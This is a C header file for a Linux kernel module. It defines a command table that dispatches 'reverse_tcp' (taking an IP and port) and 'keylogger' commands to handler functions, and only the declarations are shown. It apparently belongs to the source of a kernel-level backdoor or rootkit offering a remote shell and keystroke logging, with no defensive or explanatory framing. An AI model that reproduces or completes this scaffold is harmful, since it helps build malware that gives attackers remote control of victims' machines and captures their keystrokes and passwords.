#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/slab.h>  // For kmalloc and kfree
#include <linux/types.h> // For NULL and other types
#include <linux/string.h> // For strcmp and related functions
#include <linux/net.h>   // For socket structures
#include <linux/socket.h> // For socket functions
#include <net/sock.h>    // For socket operations

#ifndef COMMANDS_H
#define COMMANDS_H

// Define a function pointer type that accepts arguments
typedef void (*command_func_t)(const char *arg1, const char *arg2);

typedef struct {
    const char *name;
    command_func_t func;
} command_t;

// Function declarations with argument support
void execute_reversetcp_command(const char *ip, const char *port);
void execute_keylogger_command(const char *arg1, const char *arg2);  // No arguments in this case, can be ignored

// Command mapping with updated function signature
static command_t commands[] = {
    {"reverse_tcp", execute_reversetcp_command},   // reverse_tcp will accept IP and port as arguments
    {"keylogger", execute_keylogger_command},      // Keylogger can accept dummy arguments (NULL if not needed)
};

#endif
